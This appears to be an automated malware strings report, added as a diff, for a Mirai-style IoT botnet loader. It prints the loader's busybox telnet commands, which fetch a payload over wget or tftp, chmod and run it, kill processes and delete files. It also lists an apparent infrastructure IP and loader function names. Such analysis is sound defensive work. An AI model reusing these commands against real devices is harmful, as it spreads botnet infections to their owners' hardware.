@@ -1,0 +1,479 @@
+=============================================================================
+========	BINARY ID :df2cbdc05e6e759693f1b8c4741aae0980c2e1fd==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :14474
+SUPSCPECTED LINES COUNT :424
+SUPSCPECTED STRINGS COUNT (DISTINCT) :27
+SUPSCPECTED STRINGS WEIGHT :103
+SUSPECT STRING SCORE : [103 / 150] 68%
+USER AGENTS STRINGS COUNT :0
+STATIC IPs STRINGS COUNT :2
+DYNAMIC IPs STRINGS COUNT :1
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+#pid
+\npid
+$pid
+5pid
+5pid
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+../inet/netinet
+allocalim.h
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+../inet/netinet
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+../inet/netinet
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+../inet/netinet
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+../inet/netinet
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+../inet/netinet
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+../inet/netinet
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+../inet/netinet
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+../inet/netinet
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+../inet/netinet
+fork.h
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+../inet/netinet
+/usr/lib/gcc/x86_64-linux-gnu/4.8/include
+GNU C 4.8.4 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 -fgnu89-inline -fmerge-all-constants -frounding-math
+l_flags
+gscope_flagp
+p_flags
+bindflags
+gscope_flag
+_thread_db_pthread_pid
+l_symbolic_in_local_scope
+clone_flags
+l_tls_firstbyte_offset
+__flags
+__pthread_disable_asynccancel
+_dl_stack_flags
+not_first_call
+l_flags_1
+__combined
+_flags2
+l_local_scope
+dnsrch
+__pid_t
+vgetcpu_cache
+__pthread_enable_asynccancel
+PTHREAD_MUTEX_ELISION_FLAGS_NP
+GNU C 4.8.4 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 -fgnu89-inline -fmerge-all-constants -frounding-math -fexceptions -fasynchronous-unwind-tables
+F_OWNER_PID
+__pid_type
+__RLIMIT_NPROC
+SI_ASYNCIO
+_kill
+SI_ASYNCNL
+sa_flags
+si_pid
+__RLIMIT_MSGQUEUE
+__fork_generation
+SI_TKILL
+is_smp_system
+GNU C 4.8.4 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 -fgnu89-inline -fmerge-all-constants -frounding-math -fexceptions
+stepping
+bins/dlr.*
+Failed to load from bins folder!
+/bin/busybox kill -9 %d\r\n
+/bin/busybox MIORI\r\n
+/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\r\n
+/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\r\n
+echo -ne '%s' %s vrevgver; /bin/busybox MIORI\r\n
+\e[37;1mTime: [%ds] || Conns: [%d] || Logins: [%d] || Ran: [%d] || Echoes: [%d] || Wgets: [%d] || TFTPs: [%d]\n
+Failed to load bins/dlr.* as dropper
+Failed to bind to core %d\n
+yo socket mismatch
+/bin/busybox cat /bin/echo\r\n
+got connect error
+kill %%1\r\nrm -rf g5regghj vrevgver\r\n
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox MIORI\r\n
+socket not open! conn->fd: %d, fd: %d, events: %08x, state: %08x\n
+/bin/busybox ps; /bin/busybox MIORI\r\n
+/bin/busybox cat /proc/mounts; /bin/busybox MIORI\r\n
+/bin/busybox cp /bin/echo g5regghj; >g5regghj; /bin/busybox chmod 777 g5regghj; /bin/busybox MIORI\r\n
+cat /proc/cpuinfo; /bin/busybox MIORI\r\n
+/bin/busybox cp g5regghj vrevgver; > vrevgver; /bin/busybox chmod 777 vrevgver; /bin/busybox MIORI\r\n
+/bin/busybox wget http://%s:%d/gaybub/%s.%s -O - > g5regghj; /bin/busybox chmod 777 g5regghj; /bin/busybox MIORI\r\n
+/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 g5regghj; /bin/busybox MIORI\r\n
+./%s; ./%s %s.echo; /bin/busybox IROIM\r\n
+./g5regghj %s.wget; /bin/busybox IROIM\r\n
+./g5regghj %s.tftp; /bin/busybox IROIM\r\n
+rm -rf vrevgver; > g5regghj; /bin/busybox MIORI\r\n
+Failed to allocate establisted_connections array
+Failed to allocate connection %d\n
+previous_prio == -1 || (previous_prio >= __sched_fifo_min_prio && previous_prio <= __sched_fifo_max_prio)
+unexpected reloc type in static binary
+cannot set %fs base address for thread-local storage
+/usr/share/locale
+/usr/share/locale
+/proc/self/maps
+invalid fastbin entry (free)
+system bytes     = %10u\n
+(((unsigned long)(((void*)((char*)(p) + 2*(sizeof(size_t))))) & ((2 *(sizeof(size_t)) < __alignof__ (long double) ? __alignof__ (long double) : 2 *(sizeof(size_t))) - 1)) == 0)
+</sizes>\n<total type="fast" count="%zu" size="%zu"/>\n<total type="rest" count="%zu" size="%zu"/>\n<system type="current" size="%zu"/>\n<system type="max" size="%zu"/>\n
+new_size > 0 && new_size < (long) (2 * (unsigned long)((((__builtin_offsetof (struct malloc_chunk, fd_nextsize))+((2 *(sizeof(size_t)) < __alignof__ (long double) ? __alignof__ (long double) : 2 *(sizeof(size_t))) - 1)) & ~((2 *(sizeof(size_t)) < __alignof__ (long double) ? __alignof__ (long double) : 2 *(sizeof(size_t))) - 1))))
+/proc/sys/vm/overcommit_memory
+malloc(): smallbin double linked list corrupted
+((size_t) ((void*)((char*)(mm) + 2*(sizeof(size_t)))) & ((2 *(sizeof(size_t)) < __alignof__ (long double) ? __alignof__ (long double) : 2 *(sizeof(size_t))) - 1)) == 0
+(old_top == (((mbinptr) (((char *) &((av)->bins[((1) - 1) * 2])) - __builtin_offsetof (struct malloc_chunk, fd)))) && old_size == 0) || ((unsigned long) (old_size) >= (unsigned long)((((__builtin_offsetof (struct malloc_chunk, fd_nextsize))+((2 *(sizeof(size_t)) < __alignof__ (long double) ? __alignof__ (long double) : 2 *(sizeof(size_t))) - 1)) & ~((2 *(sizeof(size_t)) < __alignof__ (long double) ? __alignof__ (long double) : 2 *(sizeof(size_t))) - 1))) && ((old_top)->size & 0x1) && ((unsigned long) old_end & pagemask) == 0)
+(unsigned long) (old_size) < (unsigned long) (nb + (unsigned long)((((__builtin_offsetof (struct malloc_chunk, fd_nextsize))+((2 *(sizeof(size_t)) < __alignof__ (long double) ? __alignof__ (long double) : 2 *(sizeof(size_t))) - 1)) & ~((2 *(sizeof(size_t)) < __alignof__ (long double) ? __alignof__ (long double) : 2 *(sizeof(size_t))) - 1))))
+((unsigned long) ((void*)((char*)(brk) + 2*(sizeof(size_t)))) & ((2 *(sizeof(size_t)) < __alignof__ (long double) ? __alignof__ (long double) : 2 *(sizeof(size_t))) - 1)) == 0
+!victim || ((((mchunkptr)((char*)(victim) - 2*(sizeof(size_t)))))->size & 0x2) || ar_ptr == (((((mchunkptr)((char*)(victim) - 2*(sizeof(size_t)))))->size & 0x4) ? ((heap_info *) ((unsigned long) (((mchunkptr)((char*)(victim) - 2*(sizeof(size_t))))) & ~((2 * (4 * 1024 * 1024 * sizeof(long))) - 1)))->ar_ptr : &main_arena)
+!p || ((((mchunkptr)((char*)(p) - 2*(sizeof(size_t)))))->size & 0x2) || ar_ptr == (((((mchunkptr)((char*)(p) - 2*(sizeof(size_t)))))->size & 0x4) ? ((heap_info *) ((unsigned long) (((mchunkptr)((char*)(p) - 2*(sizeof(size_t))))) & ~((2 * (4 * 1024 * 1024 * sizeof(long))) - 1)))->ar_ptr : &main_arena)
+!newp || ((((mchunkptr)((char*)(newp) - 2*(sizeof(size_t)))))->size & 0x2) || ar_ptr == (((((mchunkptr)((char*)(newp) - 2*(sizeof(size_t)))))->size & 0x4) ? ((heap_info *) ((unsigned long) (((mchunkptr)((char*)(newp) - 2*(sizeof(size_t))))) & ~((2 * (4 * 1024 * 1024 * sizeof(long))) - 1)))->ar_ptr : &main_arena)
+!mem || ((((mchunkptr)((char*)(mem) - 2*(sizeof(size_t)))))->size & 0x2) || av == (((((mchunkptr)((char*)(mem) - 2*(sizeof(size_t)))))->size & 0x4) ? ((heap_info *) ((unsigned long) (((mchunkptr)((char*)(mem) - 2*(sizeof(size_t))))) & ~((2 * (4 * 1024 * 1024 * sizeof(long))) - 1)))->ar_ptr : &main_arena)
+<total type="fast" count="%zu" size="%zu"/>\n<total type="rest" count="%zu" size="%zu"/>\n<system type="current" size="%zu"/>\n<system type="max" size="%zu"/>\n<aspace type="total" size="%zu"/>\n<aspace type="mprotect" size="%zu"/>\n</malloc>\n
+/usr/lib/getconf
+/proc/sys/kernel/rtsig-max
+/proc/sys/kernel/ngroups_max
+/sys/devices/system/cpu/online
+/proc/meminfo
+/proc/stat
+/proc/cpuinfo
+processor
+/sys/devices/system/cpu
+/proc/self/loginuid
+HOSTALIASES
+LOCALDOMAIN
+RESOLV_HOST_CONF
+LD_BIND_NOW
+LD_BIND_NOT
+\nWARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1.\n
+/proc/sys/kernel/osrelease
+/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
+LC_MONETARY
+findlocale.c
+locale_codeset != ((void *)0)
+_nl_find_locale
+/usr/lib/locale
+loadlocale.c
+cnt < (sizeof (_nl_value_type_LC_MONETARY) / sizeof (_nl_value_type_LC_MONETARY[0]))
+_nl_intern_locale_data
+_nl_load_locale_from_archive
+/usr/lib/locale/locale-archive
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+0123456789abcdefghijklmnopqrstuvwxyz
+0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZto_outpunct
+s->_flags2 & 4
+No such process
+Interrupted system call
+No child processes
+Too many open files in system
+Read-only file system
+Level 2 not synchronized
+Machine is not on the network
+Name not unique on network
+Socket type not supported
+Network is down
+Network is unreachable
+Connection reset by peer
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+Interrupted system call should be restarted
+Socket operation on non-socket
+Protocol wrong type for socket
+Network dropped connection on reset
+Software caused connection abort
+Transport endpoint is already connected
+Transport endpoint is not connected
+Operation not possible due to RF-kill
+status == __GCONV_OK || status == __GCONV_EMPTY_INPUT || status == __GCONV_ILLEGAL_INPUT || status == __GCONV_INCOMPLETE_INPUT || status == __GCONV_FULL_OUTPUT
+/etc/localtime
+__extension__ ({ size_t __s1_len, __s2_len; (__builtin_constant_p (&zone_names[info->idx]) && __builtin_constant_p (__tzname[tp->tm_isdst]) && (__s1_len = __builtin_strlen (&zone_names[info->idx]), __s2_len = __builtin_strlen (__tzname[tp->tm_isdst]), (!((size_t)(const void *)((&zone_names[info->idx]) + 1) - (size_t)(const void *)(&zone_names[info->idx]) == 1) || __s1_len >= 4) && (!((size_t)(const void *)((__tzname[tp->tm_isdst]) + 1) - (size_t)(const void *)(__tzname[tp->tm_isdst]) == 1) || __s2_len >= 4)) ? __builtin_strcmp (&zone_names[info->idx], __tzname[tp->tm_isdst]) : (__builtin_constant_p (&zone_names[info->idx]) && ((size_t)(const void *)((&zone_names[info->idx]) + 1) - (size_t)(const void *)(&zone_names[info->idx]) == 1) && (__s1_len = __builtin_strlen (&zone_names[info->idx]), __s1_len < 4) ? (__builtin_constant_p (__tzname[tp->tm_isdst]) && ((size_t)(const void *)((__tzname[tp->tm_isdst]) + 1) - (size_t)(const void *)(__tzname[tp->tm_isdst]) == 1) ? __builtin_strcmp (&zone_names[info->idx], __tzname[tp->tm_isdst]) : (__extension__ ({ const unsigned char *__s2 = (const unsigned char *) (const char *) (__tzname[tp->tm_isdst]); int __result = (((const unsigned char *) (const char *) (&zone_names[info->idx]))[0] - __s2[0]); if (__s1_len > 0 && __result == 0) { __result = (((const unsigned char *) (const char *) (&zone_names[info->idx]))[1] - __s2[1]); if (__s1_len > 1 && __result == 0) { __result = (((const unsigned char *) (const char *) (&zone_names[info->idx]))[2] - __s2[2]); if (__s1_len > 2 && __result == 0) __result = (((const unsigned char *) (const char *) (&zone_names[info->idx]))[3] - __s2[3]); } } __result; }))) : (__builtin_constant_p (__tzname[tp->tm_isdst]) && ((size_t)(const void *)((__tzname[tp->tm_isdst]) + 1) - (size_t)(const void *)(__tzname[tp->tm_isdst]) == 1) && (__s2_len = __builtin_strlen (__tzname[tp->tm_isdst]), __s2_len < 4) ? (__builtin_constant_p (&zone_names[info->idx]) && ((size_t)(const void *)((&zone_names[info->idx]) + 1) - (size_t)(const void *)(&zone_names[info->id
+x]) == 1) ? __builtin_strcmp (&zone_names[info->idx], __tzname[tp->tm_isdst]) : (- (__extension__ ({ const unsigned char *__s2 = (const unsigned char *) (const char *) (&zone_names[info->idx]); int __result = (((const unsigned char *) (const char *) (__tzname[tp->tm_isdst]))[0] - __s2[0]); if (__s2_len > 0 && __result == 0) { __result = (((const unsigned char *) (const char *) (__tzname[tp->tm_isdst]))[1] - __s2[1]); if (__s2_len > 1 && __result == 0) { __result = (((const unsigned char *) (const char *) (__tzname[tp->tm_isdst]))[2] - __s2[2]); if (__s2_len > 2 && __result == 0) __result = (((const unsigned char *) (const char *) (__tzname[tp->tm_isdst]))[3] - __s2[3]); } } __result; })))) : __builtin_strcmp (&zone_names[info->idx], __tzname[tp->tm_isdst])))); }) == 0
+/usr/share/zoneinfo
+../nptl/sysdeps/unix/sysv/linux/x86_64/../fork.c
+({ __typeof (self->tid) __value; if (sizeof (__value) == 1) asm volatile ("movb %%fs:%P2,%b0" : "=q" (__value) : "0" (0), "i" (__builtin_offsetof (struct pthread, tid))); else if (sizeof (__value) == 4) asm volatile ("movl %%fs:%P1,%0" : "=r" (__value) : "i" (__builtin_offsetof (struct pthread, tid))); else { if (sizeof (__value) != 8) abort (); asm volatile ("movq %%fs:%P1,%q0" : "=r" (__value) : "i" (__builtin_offsetof (struct pthread, tid))); } __value; }) != ppid
+({ __typeof (({ struct pthread *__self; asm ("mov %%fs:%c1,%0" : "=r" (__self) : "i" (__builtin_offsetof (struct pthread, header.self))); __self;})->tid) __value; if (sizeof (__value) == 1) asm volatile ("movb %%fs:%P2,%b0" : "=q" (__value) : "0" (0), "i" (__builtin_offsetof (struct pthread, tid))); else if (sizeof (__value) == 4) asm volatile ("movl %%fs:%P1,%0" : "=r" (__value) : "i" (__builtin_offsetof (struct pthread, tid))); else { if (sizeof (__value) != 8) abort (); asm volatile ("movq %%fs:%P1,%q0" : "=r" (__value) : "i" (__builtin_offsetof (struct pthread, tid))); } __value; }) == ppid
+__libc_fork
+LOCALDOMAIN
+inet6
+edns0
+hosts
+netgroup
+networks
+system search path
+  dynamic: 0x%0*lx  base: 0x%0*lx   size: 0x%0*Zx\n    entry: 0x%0*lx  phdr: 0x%0*lx  phnum:   %*u\n\n
+/usr/lib/x86_64-linux-gnu/
+/usr/lib/
+version == ((void *)0) || (flags & ~(DL_LOOKUP_ADD_DEPENDENCY | DL_LOOKUP_GSCOPE_LOCK)) == 0
+binding file %s [%lu] to %s [%lu]: %s symbol `%s'
+\nrelocation processing: %s%s\n
+pid >= 0 && sizeof (pid_t) <= 4
+/proc/self/exe
+invalid target namespace in dlmopen()
+imap->l_type == lt_loaded && (imap->l_flags_1 & 0x00000008) == 0
+TLS generation counter wrapped!  Please report as described in <http://www.debian.org/Bugs/>.\n
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
+0123456789abcdefghijklmnopqrstuvwxyz
+vfscanf.c
+_IO_vfscanf_internal
+lead_zero <= (base == 16 ? (uintmax_t) (9223372036854775807L) / 4 : (uintmax_t) (9223372036854775807L))
+lead_zero <= (base == 16 ? ((uintmax_t) exponent - (uintmax_t) (-9223372036854775807L-1)) / 4 : ((uintmax_t) exponent - (uintmax_t) (-9223372036854775807L-1)))
+int_no <= (uintmax_t) (exponent < 0 ? ((9223372036854775807L) - bits + 1) / 4 : ((9223372036854775807L) - exponent - bits + 1) / 4)
+/proc/net
+net/unix
+net/if_inet6
+net/ax25
+net/nr
+net/rose
+net/ipx
+net/appletalk
+sys/net/econet
+sys/net/ash
+net/x25
+binary.c
+bin_list_len
+bin_list
+connection.c
+telnet_info.c
+findlocale.o
+__guess_grouping.part.0
+errstr.10769
+loadmsgcat.o
+localealias.o
+locale_alias_path.10053
+_IO_file_sync_mmap
+malloc_atfork
+free_atfork
+atfork_recursive_cntr
+atfork_mem
+strstr.o
+register-atfork.o
+fork_handler_pool
+inet_addr.o
+setlocale.o
+loadlocale.o
+_nl_value_type_LC_MONETARY
+random.o
+randtbl
+random_r.o
+random_poly_info
+fork.o
+wait_on_socket
+open_socket
+system_dirs
+system_dirs_len
+local_strdup
+undefined_msg
+errstring.9513
+msg.9519
+C-monetary.o
+vfscanf.o
+localtime_offset
+inet_pton.o
+inet_pton4
+_dl_build_local_scope
+__recvmsg
+__connect_nocancel
+__getpid
+random
+__strstr_sse2
+_IO_default_sync
+connect
+_IO_file_sync
+connection_consume_prompt
+binary_get_by_arch
+strndup
+inet_pton
+_nl_default_locale_path
+__strstr_sse2_unaligned
+_nl_domain_bindings
+__random
+vsscanf
+getpid
+__localtime_r
+connection_verify_payload
+server_telnet_probe
+_nl_load_locale
+_nl_unload_locale
+__netlink_open
+_nl_msg_cat_cntr
+__nss_networks_database
+server_queue_telnet
+__current_locale_name
+connection_consume_cleanup
+random_r
+socket
+__libc_disable_asynccancel
+_nl_intern_locale_data
+connection_open
+__libc_setlocale_lock
+_dl_bind_not
+srandom_r
+__recvmsg_nocancel
+telnet_info_parse
+__srandom
+__gethostname
+__nss_hosts_database
+__sscanf
+_IO_wfile_sync
+_IO_vfscanf_internal
+inet_makeaddr
+__guess_grouping
+__fork_generation_pointer
+_nl_locale_subfreeres
+connection_consume_mounts
+bind
+__get_nprocs
+inet_addr
+binary_init
+__inet_aton
+__netlink_request
+_ITM_registerTMCloneTable
+_nl_C_LC_MONETARY
+strstr
+rand
+__libc_init_first
+__linkin_atfork
+connection_consume_password_prompt
+connection_consume_written_dirs
+__register_atfork
+__libc_strstr
+_IO_new_file_sync
+connection_close
+fork
+sscanf
+_nl_remove_locale
+_ITM_deregisterTMCloneTable
+__bind
+__srandom_r
+inet_aton
+_dl_random
+__abort_msg
+__get_nprocs_conf
+localtime
+__nss_netgroup_database
+connection_upload_tftp
+_nl_current_LC_MONETARY_used
+connection_upload_echo
+srand
+telnet_info_new
+__random_r
+_IO_sscanf
+_nl_find_msg
+connection_consume_verify_login
+__vsscanf
+__libc_recvmsg
+connection_consume_arm_subtype
+connection_consume_login_prompt
+_nl_find_locale
+__fork_handlers
+__libc_enable_asynccancel
+connection_consume_upload_methods
+gethostname
+util_socket_and_bind
+setlocale
+__socket
+srandom
+__libc_fork
+_IO_vsscanf
+timelocal
+__fork_lock
+_dl_stack_flags
+connection_consume_psoutput
+__connect
+__strndup
+localtime_r
+__fork_generation
+__res_randomid
+__libc_tsd_LOCALE
+connection_upload_wget
+__pthread_enable_asynccancel
+_IO_vfscanf
+_nl_locale_file_list
+vfscanf
+_nl_global_locale
+__nscd_open_socket
+get_nprocs
+__netlink_free_handle
+connection_consume_copy_op
+__pthread_disable_asynccancel
+_dl_initfirst
+__sigprocmask
+__vfscanf
+_thread_db_pthread_pid
+__fork
+__netlink_close
+recvmsg
+___vfscanf
+_nl_current_LC_MONETARY
+get_nprocs_conf
+connection_consume_iacs
+__nscd_get_mapping
+__libc_connect
+sigprocmask
+connection_consume_arch
+_nl_load_locale_from_archive
+/locale.
+/usr/libH
+/usr/libA
+/proc/sef
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+212.237.18.166
+192.168.1.1
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+libnss_%s.so.%d.%d
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/bin/busybox cat /proc/mounts; /bin/busybox MIORI\r\n
+cat /proc/cpuinfo; /bin/busybox MIORI\r\n
+/proc/self/maps
+/proc/sys/vm/overcommit_memory
+/proc/sys/kernel/rtsig-max
+/proc/sys/kernel/ngroups_max
+/proc/meminfo
+/proc/stat
+/proc/cpuinfo
+/proc/self/loginuid
+/proc/sys/kernel/osrelease
+/proc/self/exe
+/proc/net
+/proc/sef
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
